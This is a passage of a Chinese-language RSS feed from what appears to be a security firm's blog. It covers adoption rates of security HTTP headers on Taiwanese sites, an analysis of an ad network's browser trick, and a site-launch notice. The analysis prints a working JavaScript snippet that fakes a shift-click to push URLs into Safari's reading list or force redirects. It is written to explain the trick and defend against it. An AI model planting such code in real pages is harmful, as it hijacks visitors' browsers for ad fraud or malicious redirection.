&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot; alt=&quot;Twitter 的 HTTP reponse&quot; title=&quot;Twitter 的 HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從畫紅線的部分我們可看到 Twitter 在 Cookie 設定了 Secure 與 HttpOnly 這兩個屬性，並且採用了 Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 這幾種 headers。&lt;/p&gt;

&lt;p&gt;如果覺得用圖形界面太麻煩，也可以使用 command line 的工具來觀察。下面這張圖片使用 curl 來觀察 Facebook 的 HTTP response 內容：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot; alt=&quot;Facebook 的 HTTP response&quot; title=&quot;Facebook 的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;上述資安相關的-headers-想解決哪些問題&quot;&gt;上述資安相關的 headers 想解決哪些問題？&lt;/h3&gt;

&lt;p&gt;目前這些資安相關的 HTTP headers 想解決的問題主要可分為以下五大類：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;防禦 XSS (Cross Site Scripting)：
    &lt;ul&gt;
      &lt;li&gt;Content-Security-Policy&lt;/li&gt;
      &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
      &lt;li&gt;X-XSS-Protection&lt;/li&gt;
      &lt;li&gt;X-Download-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;防禦 Clickjacking：
    &lt;ul&gt;
      &lt;li&gt;X-Frame-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;強化 HTTPS 機制：
    &lt;ul&gt;
      &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
      &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;避免瀏覽器誤判文件形態：
    &lt;ul&gt;
      &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;保護網站資源別被任意存取：
    &lt;ul&gt;
      &lt;li&gt;Access-Control-Allow-Origin（此 header 若設定錯誤會適得其反！）&lt;/li&gt;
      &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中 &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt; 與 &lt;a href=&quot;https://www.owasp.org/index.php/Clickjacking&quot;&gt;Clickjacking&lt;/a&gt; 是目前常見的攻擊手法，尤其 XSS 目前仍高居 &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;OWASP Top 10 2013 的第三名&lt;/a&gt;，其嚴重性可見一斑。而在我們執行過的許多&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;案之中，被我們找出 XSS 弱點的網站高達九成！實在是不能輕忽這些問題。若能降低這些手法攻擊成功的機率，企業的利益就能有更多的安全保障，客戶對企業的信賴亦會更加穩固。&lt;/p&gt;

&lt;h3 id=&quot;目前這些-headers-的使用狀況&quot;&gt;目前這些 headers 的使用狀況？&lt;/h3&gt;

&lt;p&gt;這麼簡便的基本防禦方式，理當廣為企業所採用，因此我們針對 &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; 中挑出 513 個可正常使用的網站（咦？一般不是 Top 500 嗎？我沒騙你，&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;真的有 525&lt;/a&gt;），調查這些網站是否使用某些常見的 HTTP headers。結果相當令人失望，許多網站都未採用這些 headers。統計數據如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從統計結果中可發現最多人使用的 HttpOnly 只有 21.25%，排名第二的 X-Frame-Options 也只有 7.80%。而且這些數據尚未將 Google、Twitter 等大公司排除，若將前述國際公司排除後，這些比率恐怕會更低。&lt;/p&gt;

&lt;p&gt;不過在上述網站中有不少入口網站、漫畫網站、色情網站，或是公司並非台灣企業，無法反應台灣的使用狀況。恰好在 2012 年 10 月台灣有許多網路服務公司一同成立了 &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA 台灣網路暨電子商務產業發展協會&lt;/a&gt;，目前網站上的&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;會員名單&lt;/a&gt;中有 116 個會員，其中不少頗具代表性，正好可觀察這些公司營運的網站是否有採用這些 headers。統計數據如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;很可惜地，所有 headers 的採用率比起上一份數據都還要低。除非公司網站僅使用靜態頁面，網站上沒有任何商業邏輯、帳號、個資，否則應該都要使用合適的 headers 為你的資安防禦工事多築一道牆。&lt;/p&gt;

&lt;p&gt;而且由於 meeya 目前沒有正式官網，是直接使用 facebook 粉絲頁作為官網，因此 Content-Security-Policy、Set-Cookie Secure、Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 等六項 headers 的統計數量都還要再減一，頓時 Content-Security-Policy 與 Strict-Transport-Security 的總數量皆降至 0 個。此狀況顯示出，即使是在一些台灣主流的網站中，相關營運人員在資安領域仍有許多努力與學習的空間。&lt;/p&gt;

&lt;p&gt;許多台灣企業經常顧著衝業績、開發新功能、趕著讓新服務上線，卻忽略了非常重要的基礎資安建設，往往是在遭到攻擊後才大呼損失慘重，甚至是已被滲透了而不自知，其企業利益與民眾個資的保障皆相當令人擔憂。&lt;/p&gt;

&lt;h3 id=&quot;下集預告&quot;&gt;下集預告&lt;/h3&gt;

&lt;p&gt;接下來本文的續作我們會分幾個篇章詳談各種 headers 的使用方式並介紹實際案例，下一篇將會探討專門防禦 XSS 的 HTTP headers，敬請期待！等不及的朋友們就請先用上面的一些關鍵字自行上網查詢囉！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/</link>
                <guid>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</guid>
                <pubDate>Mon, 10 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>奇優廣告 Qiyou 廣告手法剖析</title>
                <description>&lt;p&gt;歡迎來到我們的技術文章專欄！&lt;/p&gt;

&lt;p&gt;今天我們來談談「廣告顯示手法」。不少廣告商為了要增加廣告的曝光以及點擊率，會使用各種手法強迫使用者顯示廣告。例如彈出式視窗、內嵌廣告、強制跳轉等等。但這樣的手法有什麼好提的呢？今天有一個很特別的案例，讓我們來看看一個網站「&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com 極速漫畫&lt;/a&gt;」。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_02.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; /&gt;
這是一個常見的網路漫畫網站，接著點擊進去漫畫頁面。
&lt;!-- more --&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_03.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; /&gt;
網站中充斥著煩人的廣告，並且突然一閃而過 Safari 的「閱讀列表」動畫。怎麼會突然這樣呢？讓我們打開「閱讀列表」一探究竟。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_04.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_05.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;打開閱讀列表之後，我們赫然發現裡面被加了非常多廣告的頁面！&lt;/p&gt;

&lt;p&gt;可以看以下影片示範：&lt;/p&gt;
&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/E-BGf1MwecU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;這是怎麼做到的呢？就是一種利用 JavaScript 控制滑鼠點擊的變形應用。點選「網頁檢閱器」或是「開發者工具」，會看到一段奇怪的 JavaScript 控制滑鼠的點擊行為。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_06.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;分析節錄後的 code 如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;display:none;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;MouseEvents&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initMouseEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatchEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// nothing.&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://google.com/?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Test: FORCE_ADD_URL_TO_READINGLIST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;利用「&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&quot;&gt;initMouseEvent&lt;/a&gt;」模擬滑鼠的點擊，在 URL 上按下 Shift 鍵點擊。在一般瀏覽器中是「開啟新視窗」，在 Safari 中則是「加入閱讀清單」了，因此形成廣告視窗不斷加入閱讀清單的現象。廣告商利用這種手法增加廣告的點擊率，只要瀏覽器沒有安裝阻擋廣告的套件或者是阻擋「彈出式視窗」，你就會成為流量的貢獻者。&lt;/p&gt;

&lt;p&gt;經過我們的測試，Internet Explorer、Mozilla Firefox 不會受這類攻擊影響，Google Chrome、Opera 則會被內建的 Pop-up 視窗阻擋功能擋下。但若是直接模擬點擊，則全數瀏覽器都會受影響導向至 URL。雖然這種類型的攻擊不會造成實質上的損失跟危害，但若是結合其他惡意手法將可以造成攻擊。例如透過網站掛碼將使用者導向至惡意網站等等。&lt;/p&gt;

&lt;p&gt;若要避免此類型攻擊，有以下幾個建議方案：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;安裝 NoScript 類型套件，僅允許可信賴的網站執行 JavaScript&lt;/li&gt;
  &lt;li&gt;開啟「彈出式視窗」阻擋功能，並將網站安全性等級提高。&lt;/li&gt;
  &lt;li&gt;安裝 AdBlock 等廣告阻擋套件（但會影響網站營收）&lt;/li&gt;
  &lt;li&gt;使用最新版本瀏覽器以策安全&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;網頁型的攻擊越來越多樣化，除了依賴瀏覽器本身的保護並輔以第三方安全套件之外，更需要使用者本身的安全意識，才能安心暢快的瀏覽網路！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking/</link>
                <guid>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking</guid>
                <pubDate>Thu, 06 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 新網站上線！</title>
                <description>&lt;p&gt;DEVCORE 的新網站上線了！&lt;br /&gt;
非常感謝專業的 &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; 幫我們設計精美的網站！&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;我們目前主要服務項目為滲透測試、資安教育訓練、資安事件處理、資安顧問服務，&lt;br /&gt;
各項服務的詳細內容可參考 &lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Services&lt;/a&gt; 頁面。&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;同時，在官網中我們將會不定期提供最新的資安新知及技術文章，&lt;br /&gt;
希望藉由我們的力量讓大眾更清楚資訊安全的重要。&lt;br /&gt;
並且透過站內的教學文獻，讓開發者、管理者進一步了解駭客的思維、攻防的手法，&lt;br /&gt;
知己知彼，才能百戰不怠。瞭解如何攻擊，更能知道如何防禦。&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;若對我們的網站內容或服務有任何建議，歡迎您隨時與我們聯繫。&lt;br /&gt;
希望我們能為您的企業資訊安全最佳把關者！&lt;br /&gt;
歡迎隨時聯絡我們！ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact [at] devco.re&lt;/code&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/02/27/devcore-new-website/</link>
                <guid>https://devco.re/blog/2014/02/27/devcore-new-website</guid>
                <pubDate>Thu, 27 Feb 2014 00:00:00 +0800</pubDate>
        </item>


</channel>
</rss>
